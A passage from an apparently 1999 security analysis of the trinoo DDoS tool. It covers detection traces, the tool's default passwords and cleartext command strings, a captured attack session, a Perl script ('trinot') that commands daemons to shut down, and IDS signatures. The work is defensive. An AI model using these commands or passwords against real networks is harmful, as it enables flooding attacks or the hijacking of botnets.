+ns      1316 root    4u  inet   2503            UDP *:1024 
+------------------------------------------------------------------------------
+
+
+Defenses
+--------
+
+Of course, the best defense is to prevent intrusions and root level
+compromise of your systems in the first place, so there would be no
+systems on which to install trinoo master/daemons.  In an ideal world,
+all systems would be patched, secured, monitored, intrusion detection
+systems and firewalls would be available to detect and reject packets,
+and I'd be a multi-millionaire living six months of the year in a beach
+mansion on Bali, and six months in the French Alps.  In the real world,
+this is not an option (at least not in the foreseeable future.)
+
+Instead, your network may already have several trinoo daemons running
+and ready to DoS other systems at any minute.  So how can they be
+detected or disabled?
+
+Because the programs use high numbered UDP ports for both communication
+and attack, it will be very difficult (if not impossible) to block it
+without breaking programs that use UDP on high numbered ports.
+
+The easiest method to detect the presence of trinoo masters or daemons
+(as the code exists presently) may be to monitor all UDP packets on
+shared Ethernet segments and look for the tell tale signs of
+communication between master(s) and daemon(s) as described elsewhere in
+this paper. (Switches would preclude seeing UDP packets that are not
+associated with the MAC address of the monitoring host's network
+interface.)  Unfortunately, this would only occur during an attack,
+which would likely become known by network throughput degradation and/or
+reports of denial of service attacks from victim sites.
+
+If a system is suspected of hosting a trinoo daemon that is actively
+attacking, the output of the Solaris "truss" program on the running
+daemon will show output like the following:
+
+------------------------------------------------------------------------------
+ . . .
+getmsg(3, 0xEFFFF830, 0xEFFFF83C, 0xEFFFF81C)	= 0
+getmsg(3, 0xEFFFF830, 0xEFFFF83C, 0xEFFFF81C) (sleeping...)
+getmsg(3, 0xEFFFF830, 0xEFFFF83C, 0xEFFFF81C)	= 0
+time()						= 938385467
+open("/dev/udp", O_RDWR)			= 5
+ioctl(5, I_PUSH, "sockmod")			= 0
+ioctl(5, I_STR, 0xEFFFF748)			= 0
+ioctl(5, I_SETCLTIME, 0xEFFFF7FC)		= 0
+ioctl(5, I_SWROPT, 0x00000002)			= 0
+sigprocmask(SIG_SETMASK, 0xEFFFF7EC, 0xEFFFF7DC) = 0
+ioctl(5, I_STR, 0xEFFFF660)			= 0
+sigprocmask(SIG_SETMASK, 0xEFFFF7DC, 0xEFFFF7B8) = 0
+sigprocmask(SIG_BLOCK, 0xEFFFF548, 0xEFFFF5C0)	= 0
+ioctl(5, I_STR, 0xEFFFF548)			= 0
+sigprocmask(SIG_SETMASK, 0xEFFFF5C0, 0x00000000) = 0
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+ . . .
+------------------------------------------------------------------------------
+
+The traffic on the network during an attack against a single target
+(as seen by "tcpdump") would look like:
+
+------------------------------------------------------------------------------
+# tcpdump ip host 192.168.0.1
+ . . .
+15:40:08.491782 10.0.0.1.1024 > 192.168.0.1.27444: udp 25
+15:40:08.574453 192.168.0.1.32885 > 216.160.XX.YY.16838: udp 4 (DF)
+15:40:08.576427 192.168.0.1.32885 > 216.160.XX.YY.5758: udp 4 (DF)
+15:40:08.579752 192.168.0.1.32885 > 216.160.XX.YY.10113: udp 4 (DF)
+15:40:08.583056 192.168.0.1.32885 > 216.160.XX.YY.17515: udp 4 (DF)
+15:40:08.600948 192.168.0.1.32885 > 216.160.XX.YY.31051: udp 4 (DF)
+15:40:08.604943 192.168.0.1.32885 > 216.160.XX.YY.5627: udp 4 (DF)
+15:40:08.610886 192.168.0.1.32885 > 216.160.XX.YY.23010: udp 4 (DF)
+15:40:08.614202 192.168.0.1.32885 > 216.160.XX.YY.7419: udp 4 (DF)
+15:40:08.615507 192.168.0.1.32885 > 216.160.XX.YY.16212: udp 4 (DF)
+15:40:08.616854 192.168.0.1.32885 > 216.160.XX.YY.4086: udp 4 (DF)
+15:40:08.618827 192.168.0.1.32885 > 216.160.XX.YY.2749: udp 4 (DF)
+15:40:08.623480 192.168.0.1.32885 > 216.160.XX.YY.12767: udp 4 (DF)
+15:40:08.625458 192.168.0.1.32885 > 216.160.XX.YY.9084: udp 4 (DF)
+15:40:08.628764 192.168.0.1.32885 > 216.160.XX.YY.12060: udp 4 (DF)
+15:40:08.632090 192.168.0.1.32885 > 216.160.XX.YY.32225: udp 4 (DF)
+ . . .
+------------------------------------------------------------------------------
+
+
+Weaknesses
+----------
+
+The first weakness is that the crypt() encrypted passwords, and some
+prompts and return strings, are visible in both the master and daemon
+binary images.
+
+This can allow you to identify whether you have found a master or a
+daemon, determine whether the passwords are the defaults shown in this
+paper or not, and potentially allow you to exploit the password
+weaknesses to take control of some/all of the trinoo network yourself.
+
+If the source code has been modified (which it no doubt will by smarter
+attackers), you would need to crack the passwords, or use a
+hexadecimal/ASCII editor (e.g., "xxd", part of the VIM editor suite) and
+change them in the binary image, in order to, for example, run the
+master to retrieve the list of daemons.
+
+If the source has not, you can determine this fact by observing the
+strings embedded in the program binary:
+
+------------------------------------------------------------------------------
+# strings - ns
+ . . .
+socket
+bind
+recvfrom
+%s %s %s
+aIf3YWfOhw.V.		&lt;=== crypt() encrypted password "l44adsl"
+PONG
+*HELLO*
+ . . .
+
+# strings - master
+ . . .
+---v
+v1.07d2+f3+c
+trinoo %s
+l44adsl			&lt;=== clear text version of daemon password
+sock
+0nm1VNMXqRMyM		&lt;=== crypt() encrypted password "gOrave"
+10:09:24
+Sep 26 1999
+trinoo %s [%s:%s]
+bind
+read
+*HELLO*
+ZsoTN.cq4X31		&lt;=== CRYPTKEY
+bored
+NEW Bcast - %s
+PONG
+PONG %d Received from %s
+Warning: Connection from %s
+beUBZbLtK7kkY		&lt;=== crypt() encrypted password "betaalmostdone"
+trinoo %s..[rpm8d/cb4Sx/]
+ . . .
+DoS: usage: dos &lt;ip>
+DoS: Packeting %s.
+aaa %s %s
+mdie
+ErDVt6azHrePE		&lt;=== crypt() encrypted password for "mdie" command
+mdie: Disabling Bcasts.
+d1e %s
+mdie: password?
+ . . .
+------------------------------------------------------------------------------
+
+Next, and more vulnerable, is the daemon password, which travels the
+network in clear text form.  Assuming you know the UDP port on which the
+master communicates to the client, you can capture the password using
+"sniffit", "ngrep", "tcpdump", or any network monitoring program capable
+of showing UDP packet data payloads (see Appendix A for a sample
+session logged with "ngrep").
+
+For example, here is the "png" command being sent to the trinoo daemon
+as seen by "sniffit":
+
+UDP Packet ID (from_IP.port-to_IP.port): 10.0.0.1.1024-192.168.0.1.27444
+ 45 E 00 . 00 . 27 ' 1A . AE . 00 . 00 . 40 @ 11 . 47 G D4 . 0A . 00 . 00 . 01 .
+ C0 . A8 . 00 . 01 . 04 . 00 . 6B k 34 4 00 . 13 . 2F / B7 . 70 p 6E n 67 g 20  
+ 6C l 34 4 34 4 61 a 64 d 73 s 6C l
+
+As was mentioned earlier, the "mdie" command in the trinoo master is
+password protected in the master itself.  There are a couple ways
+to attack this.
+
+If you can determine the crypt() encrypted string using the Unix
+"strings" command, you could (potentially) use a password cracking
+utility, such as "crack",  and break it (see Appendix C).  This may
+take a LONG time if the password was well chosen, but it is feasible
+(and the "killme" password for the "mdie" command was cracked in less
+than 30 seconds on a Pentium II).
+
+You could try to sniff the password on the wire between the attacker
+and the master, but presumably this command would not be used by the
+attackers often, if at all, since they want the daemons to be active
+when needed for an attack.
+
+You may have more luck sniffing the daemon password, since it is
+required for most commands.  This can be done on either the daemon's or
+master's network (these are usually entirely different networks.) It
+should be easier to accomplish on the daemon's network since there are
+far more daemons than masters.  Since many of the masters have been
+found on primary name servers, presumably there would be more traffic
+on high-numbered UDP ports on networks containing masters than on
+networks containing daemons (outside of the duration of denial of
+service attacks, that is.) Furthermore you will likely find several
+daemons at a given site, possibly as a result of detecting the
+original system compromise.
+
+Once you have located a daemon, you have also found the list of IP
+addresses of masters (use "strings" to see them.)  You should
+immediately contact these sites and convince them to closely inspect the
+system for signs of intrusion, with likely "root kit" installations to
+make this task more difficult, and attempt to coordinate a response.
+
+Having found a master, the list of daemons (which will likely include
+hosts at many other sites) can be obtained by simply identifying the
+file which contains the list, if unencrypted.  If, however, the file is
+encrypted, you would either have to decrypt the Blowfish encrypted file
+using the same key compiled into the program, or by taking control of
+the master and using the "bcast" command.
+
+It you have identified an active command session to a master, which is
+a standard "telnet" style TCP session, you could hijack the session
+using "hunt" and start executing commands.  Not knowing the "mdie"
+command password, you could not disable all the daemons directly, but
+you COULD use the "bcast" command and get a list of all of them (you
+would probably want to do this using the "script" command to generate
+a transcript of the session, as this could be a very large list).
+
+Once you know the addresses of all the daemons, and the daemon
+password (visible in "strings" output), you could then send the proper
+command string in UDP packets to any suspected trinoo daemon(s).
+Creation and transmission of UDP packets can be accomplished with
+tools like LibNet, Spak, the Perl Net::RawIP library, etc.  (A Perl
+script using Net::RawIP named "trinot" has been developed to
+accomplish this task.  See Appendix B).
+
+As the typical installation of the daemon includes a crontab entry
+that runs it every minute, you would have to constantly spray your
+entire network to keep the daemons from re-starting.  (This may be due
+to programming bugs that cause the daemons to crash occasionally, or
+may be to defeat system administrators who simply notice and kill the
+process, but do not think to check for a crontab entry that re-starts
+the daemon.)
+
+The daemons can also be found on your network by sniffing the data
+portion of UDP packets for the strings "*HELLO*" and "PONG", or any of
+the command strings themselves for that matter (until the source is
+modified to change these strings, of course.) The "ngrep" program
+works nicely for this:
+
+------------------------------------------------------------------------------
+# ngrep -i -x "*hello*|pong" udp
+interface: eth0 (192.168.0.200/255.255.255.0)
+filter: ip and ( udp )
+match: *hello*|pong
+ . . .
+#
+U 192.168.0.1:32887 -> 10.0.0.1:31335
+  2a 48 45 4c 4c 4f 2a                                  *HELLO*         
+###
+U 192.168.0.1:32888 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+U 192.168.0.3:32815 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+U 192.168.0.5:32798 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+ . . .
+------------------------------------------------------------------------------
+
+While not weaknesses in trinoo itself, there are also weaknesses in
+the way the trinoo networks are set up.
+
+As mentioned earlier, some systems showed crontab entries used to
+start the daemons once per minute.  This leaves an obvious fingerprint
+on crontab files.
+
+The scripts observed to automate the installation of trinoo networks
+use the Berkeley "rcp" command (use of rcp has also been observed in a
+file upload capability built into newer versions of the "Tribe Flood
+Network" daemon program).  Monitoring "rcp" connections (514/tcp) from
+multiple systems on your network, in quick succession, to a single IP
+address outside your network would be a good trigger. (Note that the
+use of "rcp" in a script requires an anonymous trust relationship,
+usually in the form of "+ +" in a user's ~/.rhosts file, which also
+will allow you to immediately archive the contents of this account
+while contacting the owners to preserve evidence.)
+
+(Further analysis of trinoo by George Weaver of Pennsylvania State
+University and David Brumley of Stanford niversity is included in
+Appendix E - Further methods of detecting trinoo.  George deserves
+special credit for attempting to hand-decompile a recovered SPARC
+binary image! ;)
+
+
+The next logical evolutionary steps
+-----------------------------------
+
+One of the easiest attacks to implement is the denial of service
+attack.  Many bugs exist in TCP/IP stacks, for example, that allow
+fragmented packets, large packets, IP options, half-open TCP
+connections, or floods of packets (highest bandwidth wins) etc., to
+cause the system performance to be degraded, or actually crash the
+system.
+
+As each bug is found, an exploit program demonstrating the bug is
+generally produced.  Each of these exploit programs is generally
+unique, exploiting a specific bug that may only affect a single TCP/IP
+implementation (although with Microsoft having such a large market
+share of personal computers, and many home users being almost totally
+unaware of such bugs, let alone where to get and how to apply patches
+to fix these bugs, the chances are high that a multi-exploit attack
+will succeed in crashing the target system.)
+
+These denial of service exploits are available from numerous sites
+on the Internet, such as:
+
+	http://www.technotronic.com/denial.html
+	http://www.rootshell.com/
+
+The next step was to combine multiple denial of service exploits
+into one tool, using Unix shell scripts.  One such tool, named "rape",
+(according to the code it was written in 1998 by "mars", with
+modifications by "TheVirus" and further code improvements by "ttol")
+integrates the following exploits into a single shell script:
+
+  echo "Editted for use with www.ttol.base.org"
+  echo "rapeing $IP. using weapons:"
+  echo  "latierra          "
+  echo -n "teardrop v2        "
+  echo -n "newtear           "
+  echo -n "boink             "
+  echo -n "bonk              "
+  echo -n "frag              "
+  echo -n "fucked            "
+  echo -n "troll icmp        "
+  echo -n "troll udp         "
+  echo -n "nestea2            "
+  echo -n "fusion2           "
+  echo -n "peace keeper      "
+  echo -n "arnudp            "
+  echo -n "nos               "
+  echo -n "nuclear           "
+  echo -n "ssping            "
+  echo -n "pingodeth         "
+  echo -n "smurf             "
+  echo -n "smurf4            "
+  echo -n "land              "
+  echo -n "jolt              "
+  echo -n "pepsi             "
+
+A tool like this has the advantage of allowing an attacker to give a
+single IP address and have multiple attacks be launched (increasing
+the probability of successful attack), but meant having to have
+pre-compiled versions of each individual exploit packaged up in a Unix
+"tar" format archive, etc., for convenient transfer to a (usually
+stolen) account from which to launch the attack.
+
+To still allow multiple denial of service exploits to be used, but with
+a single pre-compiled program that is more easy to store, transfer,
+and use quickly, programs like "targa.c" by Mixter were developed.
+Targa combines all of the following exploits in a single C source
+program:
+
+/* targa.c - copyright by Mixter &lt;mixter@gmx.net>
+   version 1.0 - released 6/24/98 - interface to 8
+   multi-platform remote denial of service exploits
+ */                                                                             
+ . . .
+
+/* bonk by route|daemon9 & klepto
+ * jolt by Jeff W. Roberson (modified by Mixter for overdrop effect)
+ * land by m3lt
+ * nestea by humble & ttol
+ * newtear by route|daemon9
+ * syndrop by PineKoan
+ * teardrop by route|daemon9
+ * winnuke by _eci */                                                           
+
+Even combined denial of service tools like "targa" still only allow
+one attacker to hit one IP address at a time.
+
+To increase the effectiveness of the attack, groups of attackers,
+using IRC channels or telephone "voice bridges" for communication,
+could coordinate attacks, each person hitting a different system.
+This same coordination is being seen in probing for vulnerabilities,
+and in system compromise and control using multiple back doors
+and "root kits."
+
+Even this has its limits, so in less than two years, it appears the
+next logical step has been taken to combine the power of a number of
+compromised systems into a distributed "denial of service cluster."
+The "trinoo" tool is an example of this, as is another similar tool
+available in the computer underground called the "Tribe Flood Network"
+(or "TFN") by Mixter.
+
+While trinoo only implements UDP flood attacks, TFN supports ICMP
+flood, UDP flood, SYN flood, and Smurf style attacks, and is
+controlled via commands sent as ICMP_ECHOREPLY (ICMP Type 0) packets.
+It also employs Blowfish encryption, similar to trinoo.  (TFN is
+analyzed in a separate paper).
+
+It is all but guaranteed that these tools will continue to follow this
+trend and evolve into truly robust, covert, and distributed denial of
+service attack tools that employ strong encryption of embedded
+strings, passwords to control execution (possibly with trip wires
+that self-destruct, or wipe the entire system disc, if run in the
+wrong way, or by the wrong person), using encrypted communication
+channels, and communicating using packets posing as protocols like
+ICMP that are difficult to detect or block by firewalls.
+
+--
+David Dittrich &lt;dittrich@cac.washington.edu>
+http://staff.washington.edu/dittrich/                                           
+
+
+
+Appendix A: Example of network session captured with "ngrep"
+------------------------------------------------------------
+
+The following is an example of what an attack session would look
+like when viewed with "ngrep".
+
+------------------------------------------------------------------------------
+# ngrep -x ".*" tcp port 27665 or udp port 31335 or udp port 27444
+interface: eth0 (192.168.0.200/255.255.255.0)
+filter: ip and ( tcp port 27665 or udp port 31335 or udp port 27444 )
+match: .*
+#
+U 192.168.0.1:32892 -> 10.0.0.1:31335
+  2a 48 45 4c 4c 4f 2a                                  *HELLO*         
+#
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  ff f4 ff fd 06                                        .....           
+######
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  62 65 74 61 61 6c 6d 6f    73 74 64 6f 6e 65 0d 0a    betaalmostdone..
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  74 72 69 6e 6f 6f 20 76    31 2e 30 37 64 32 2b 66    trinoo v1.07d2+f
+  33 2b 63 2e 2e 5b 72 70    6d 38 64 2f 63 62 34 53    3+c..[rpm8d/cb4S
+  78 2f 5d 0a 0a 0a                                     x/]...          
+##
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  74 72 69 6e 6f 6f 3e 20                               trinoo>         
+###
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  62 63 61 73 74 0d 0a                                  bcast..         
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  4c 69 73 74 69 6e 67 20    42 63 61 73 74 73 2e 0a    Listing Bcasts..
+  0a                                                    .               
+###
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  31 39 32 2e 31 36 38 2e    30 2e 31 2e 20 20 20 0a    192.168.0.1.
+  0a 45 6e 64 2e 20 31 20    42 63 61 73 74 73 20 74    .End. 1 Bcasts t
+  6f 74 61 6c 2e 0a 74 72    69 6e 6f 6f 3e 20          otal..trinoo>   
+##
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  6d 74 69 6d 65 72 20 31    30 30 30 0d 0a             mtimer 1000..     
+##
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  6d 74 69 6d 65 72 3a 20    53 65 74 74 69 6e 67 20    mtimer: Setting 
+  74 69 6d 65 72 20 6f 6e    20 62 63 61 73 74 20 74    timer on bcast t
+  6f 20 31 30 30 30 2e 0a                               o 1000..          
+#
+U 10.0.0.1:1025 -> 192.168.0.1:27444
+  62 62 62 20 6c 34 34 61    64 73 6c 20 31 30 30 30    bbb l44adsl 1000
+##
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  6d 74 69 6d 65 72 3a 20    53 65 74 74 69 6e 67 20    mtimer: Setting 
+  74 69 6d 65 72 20 6f 6e    20 62 63 61 73 74 20 74    timer on bcast t
+  6f 20 31 30 30 30 2e 0a                               o 1000..          
+###
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  74 72 69 6e 6f 6f 3e 20                               trinoo>         
+###
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  6d 73 69 7a 65 20 33 32    30 30 30 0d 0a             msize 32000..     
+#
+U 10.0.0.1:1025 -> 192.168.0.1:27444
+  72 73 7a 20 33 32 30 30    30                         rsz 32000         
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  74 72 69 6e 6f 6f 3e 20                               trinoo>         
+###
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  64 6f 73 20 32 31 36 2e    31 36 30 2e 58 58 2e 59    dos 216.160.XX.Y
+  59 0d 0a                                              Y..             
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  44 6f 53 3a 20 50 61 63    6b 65 74 69 6e 67 20 32    DoS: Packeting 2
+  31 36 2e 31 36 30 2e 58    58 2e 59 59 2e 0a          16.160.XX.YY..  
+#
+U 10.0.0.1:1025 -> 192.168.0.1:27444
+  61 61 61 20 6c 34 34 61    64 73 6c 20 32 31 36 2e    aaa l44adsl 216.
+  31 36 30 2e 58 58 2e 59    59                         160.XX.YY       
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  74 72 69 6e 6f 6f 3e 20                               trinoo>         
+##
+T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+  71 75 69 74 0d 0a                                     quit..          
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+  62 79 65 20 62 79 65 2e    0a                         bye bye..       
+###
+T 192.168.100.1:1075 -> 10.0.0.1:27665 [AP]
+  62 65 74 61 61 6c 6d 6f    73 74 64 6f 6e 65 0d 0a    betaalmostdone..
+##
+T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+  74 72 69 6e 6f 6f 20 76    31 2e 30 37 64 32 2b 66    trinoo v1.07d2+f
+  33 2b 63 2e 2e 5b 72 70    6d 38 64 2f 63 62 34 53    3+c..[rpm8d/cb4S
+  78 2f 5d 0a 0a 0a                                     x/]...          
+###
+T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+  74 72 69 6e 6f 6f 3e 20                               trinoo>         
+###
+T 192.168.100.1:1075 -> 10.0.0.1:27665 [AP]
+  6d 70 69 6e 67 0d 0a                                  mping..         
+##
+T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+  6d 70 69 6e 67 3a 20 53    65 6e 64 69 6e 67 20 61    mping: Sending a
+  20 50 49 4e 47 20 74 6f    20 65 76 65 72 79 20 42     PING to every B
+  63 61 73 74 73 2e 0a                                  casts..         
+#
+U 10.0.0.1:1025 -> 192.168.0.1:27444
+  70 6e 67 20 6c 34 34 61    64 73 6c                   png l44adsl     
+##
+U 192.168.0.1:32894 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+##
+T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+  74 72 69 6e 6f 6f 3e 20    50 4f 4e 47 20 31 20 52    trinoo> PONG 1 R
+  65 63 65 69 76 65 64 20    66 72 6f 6d 20 31 39 32    eceived from 192
+  2e 31 36 38 2e 30 2e 31    0a                         .168.0.1
+##
+T 192.168.100.1:1075 -> 10.0.0.1:27665 [AP]
+  71 75 69 74 0d 0a                                     quit..          
+#
+T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+  62 79 65 20 62 79 65 2e    0a                         bye bye..       
+------------------------------------------------------------------------------
+
+
+Appendix B - trinot script
+--------------------------
+
+-------------------------------  cut here  -----------------------------------
+#!/usr/bin/perl -w
+#
+# trinot v. 1.1
+# By Dave Dittrich &lt;dittrich@cac.washington.edu>
+# 
+# Send commands to trinoo daemon(s), causing them to PONG, *HELLO*
+# to all their masters, exit, etc.  Using this program (and knowledge
+# of the proper daemon password), you can affect trinoo daemons
+# externally and monitor packets to verify if the daemons are up,
+# expose their masters, or shut them down.
+#
+# Needs Net::RawIP (http://quake.skif.net/RawIP)
+# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)
+#
+# Example: ./trinot host1 [host2 [...]]
+#          ./trinot -S host
+#          ./trinot -p password -P host
+#
+# (This code was hacked from the "macof" program, written by
+# Ian Vitek &lt;ian.vitek@infosec.se>)
+
+require 'getopts.pl';
+use Net::RawIP;
+
+$a = new Net::RawIP({udp => {}});
+chop($hostname = `hostname`);
+
+Getopts('PSDp:f:s:d:l:i:vh');
+die "usage: $0 [options] host1 [host2 [...]]\
+\t-P\t\t\tSend \"png\" command\
+\t-S\t\t\tSend \"shi\" command\
+\t-D\t\t\tSend \"d1e\" command (default)\
+\t-p password\t\t(default:\"l44adsl\")
+\t-f from_host\t\t(default:$hostname)\
+\t-s src_port\t\t(default:random)\
+\t-d dest_port\t\t(default:27444)\
+\t-l ipfile\t\tSend to IP addresses in ipfile\
+\t-i interface \t\tSet sending interface (default:eth0)\
+\t-v\t\t\tVerbose\
+\t-h This help\n" unless ( !$opt_h );
+
+# set default values
+$opt_i = ($opt_i) ? $opt_i : "eth0";
+$s_port = ($opt_s) ? $opt_s : int rand 65535;
+$d_port = ($opt_d) ? $opt_d : 27444;
+$pass = ($opt_p) ? $opt_p : "l44adsl";
+
+# choose network card
+if($opt_e) {
+  $a->ethnew($opt_i, dest => $opt_e);
+} else {
+  $a->ethnew($opt_i);
+}
+
+$cmd = ($opt_P) ? "png $pass" :
+       ($opt_S) ? "shi $pass" :
+       ($opt_D) ? "d1e $pass" :
+       "d1e $pass";
+$s_host = ($opt_f) ? $opt_f : $hostname;
+
+if ($opt_l) {
+  open(I,"&lt;$opt_l") || die "could not open file: '$opt_l'";
+  while (&lt;I>) {
+    chop;
+    push(@ARGV,$_);
+  }
+  close(I);
+}
+
+foreach $d_host (@ARGV) {
+  $a->set({ip => {saddr => $s_host, daddr => $d_host},
+           udp => {source => $s_port, dest => $d_port, data => $cmd}
+          });
+  print "sending '$cmd' to $d_host\n" if $opt_v;
+  $a->send;
+}
+
+exit(0);
+-------------------------------  cut here  -----------------------------------
+
+
+Appendix C - References
+-----------------------
+
+TCP/IP Illustrated, Vol. I, II, and III. W. Richard Stevens and Gary
+R. Wright., Addison-Wesley.
+
+lsof:
+	ftp://vic.cc.purdue.edu/pub/tools/unix/lsof/
+
+tcpdump:
+
+	ftp://ftp.ee.lbl.gov/tcpdump.tar.Z
+
+hunt:
+	http://www.cri.cz/kra/index.htm
+
+sniffit:
+	http://sniffit.rug.ac.be/sniffit/sniffit.html
+
+ngrep:
+	http://www.packetfactory.net/ngrep/
+
+loki client/server:
+	Phrack Magazine, Volume Seven, Issue Forty-Nine,
+	File 06 of 16, [ Project Loki ]
+	http://www.phrack.com/search.phtml?view&article=p49-6
+
+	Phrack Magazine  Volume 7, Issue 51 September 01, 1997,
+	article 06 of 17 [ L O K I 2   (the implementation) ]
+	http://www.phrack.com/search.phtml?view&article=p51-6
+
+LibNet:
+	http://www.packetfactory.net/libnet/
+
+Net::RawIP:
+	http://quake.skif.net/RawIP
+
+crack:
+	http://www.crypto.dircon.co.uk/
+
+Password cracking utilities:
+	http://packetstorm.securify.com/Crackers/
+
+targa.c:
+	http://packetstorm.securify.com/exploits/DoS/targa.c
+
+
+
+Appendix D - Abbreviated report of actual trinoo attack.
+------------------------------------------------------
+
+The following is an abbreviated version the initial report sent out by
+Susan Levy Haskell of the University of Minnesota.  This report,
+which only concerns a small time span in the three day attack, showed
+227 unique attacking systems, 114 of which were at Internet 2 sites.
+(The actual list of attacking systems, all of which are also root
+compromised victims in their own right, have been removed. A complete
+report of all unique attacking IP addresses over the three day period
+is not available.)
+
+Just to show what a large trinoo network could do, consider that a file
+(named "owned.log") containing 888 IP addresses was found same location
+as the trinoo source code analyzed here (which is assumed to be the same
+code as that used for the attack).  Another file in that directory
+(named "216") contains addresses of 10549 systems on 216.0.0.0/8
+netblocks, and is assumed to be a list of potential targets for
+compromise and trinoo daemon/master installation.  Rumors on Usenet
+newsgroups and Slashdot put the number of systems controlled by this
+group in the 3000+ range.
+
+----------------------------------------------------------------------------
+Hello:
+
+This is a notification that a system at your site apparently was used in
+a large-scale UDP flood on a system at the University of Minnesota.  The
+hosts below have been involved in a series of escalating large-scale
+denials-of-service that are flooding the University of Minnesota off the
+internet.  They are periodic, but expanding in the number of hosts used
+to attack.
+
+We would like to hear about it if you can confirm whether your system(s)
+were used.  We're also *very* interested in any information about this
+tool (since it appears to be new, and quite effective).  Thus far, all
+hosts used in this attack appear to have been Solaris 2.x systems that
+were compromised using the recently-announced rpc.cmsd exploits (see
+http://www.cert.org/advisories/CA-99-08-cmsd.html for details).
+
+The following are lists of hosts apparently used, and the period of use.
+We're certain about the timestamps--they're in CDT (-500)--but as with 
+all such floods, they ramp up and tail off.  Since we're getting data in 
+ten-minute slices, the times are approximate.  
+
+The floods use unforged source IPs and consistent UDP source-ports.  The
+destination ports are random, aimed at 160.94.196.192.
+The packets are 32-byte UDP (and each flow represents many packets).
+
+I've included profile information below, rather than log excerpts,
+because these run to many GB.  If you would like Cisco net-flow excerpts
+to demostrate the behavior, please reply to this message & ask.
+
+All attacks have been launched at 160.94.196.192 (irc2.tc.umn.edu).
+And, as I mentioned, all times are in CDT (-500) from an ntp-slaved log
+host (for the ten-minute segments).
+
+Thank you.
+
+-susan
+--
+Susan B. Levy Haskell   /  sblh@nts.umn.edu  /   voice: (612) 626-8639
+Security Incident Response Coordinator             fax: (612) 626-1002  
+Networking and Telecommunications Services,    University of Minnesota
+*** To report a security incident in progress, call (612) 625-0006 ***
+=================================================
+
+
+Appendix E - Further methods of detecting trinoo
+------------------------------------------------
+
+Authors: David Brumley &lt;dbrumley@stanford.edu>
+	 David Dittrich &lt;dittrich@cac.washington.edu>
+	 George Weaver &lt;gmw@psu.edu>
+
+Detecting Trinoo
+
+Currently Trinoo has several signatures that allow it to be detected from
+IP flow records.  
+
+Trinoo Daemon (ns.c) -
+1. The trinoo daemon by default listens to UDP port 27444
+2. All communication with the trinoo daemon must have the string l44
+(ell 44).
+3. The SYN flood mechanism picks the destination port via the following
+algorithm:
+	to.syn_port = htons(rand() % 65534)
+
+   Several observations can be made:
+	a. randomize()/srandom() is never called, so the destination port
+	   will always fit the following algorithm:
+	   SYN packet 1 has destination port x
+	   SYN packet 2 has destination port y as defined by
+		 srandom(x); y = rand();
+	   SYN packet 3 has destination port z as defined by
+		 srandom(y); z = rand();
+	b. Since the port is a result of modulus 65534, destination port 0
+	   will show up, while destination port 65535 will not.
+
+IDS detection of daemon:
+1. Look for UDP connections to destination port 27444. This is indicative
+of the control session.
+2. The string l44 will determine with a large probability that the packet
+is part of a trinoo control session.
+3. Running trinoo DoS attacks (SYN Floods) can be identified by the
+algorithm given in 3 above.  In addition, if you can catch the first SYN,
+it will *always* be the result of srand(1); rand();. On one authors
+laptop, an example sequence of destination ports would be:
+	32540
+	48264
+	58208
+	56084
+	46021
+	37263
+	6890
+	38941
+	17766
+	40714
+
+Although this doesn't stop the Denial of Service, it will say with some
+probability this is a trinoo attack, and you should start looking for a
+master!
+
+Detecting the trinoo daemon on your network:
+1. Trinoo daemons can be indexed by a master by sending a png command.
+Live daemons will respond with a PONG. The original author probably added
+this so the master can see which daemons are still alive.  You can scan a
+network with the attached program for anything that responds appropriately
+(which chances are is a trinoo daemon).
+
+Trinoo Server (master.c) -
+The network communications that are indicative of a trinoo server are:
+1. Sending UDP packets with destination port 27444
+2. UDP packets as described above with the string l44adsl (ell 44 a d s
+ell)
+3. A server will bind to port 27665
+
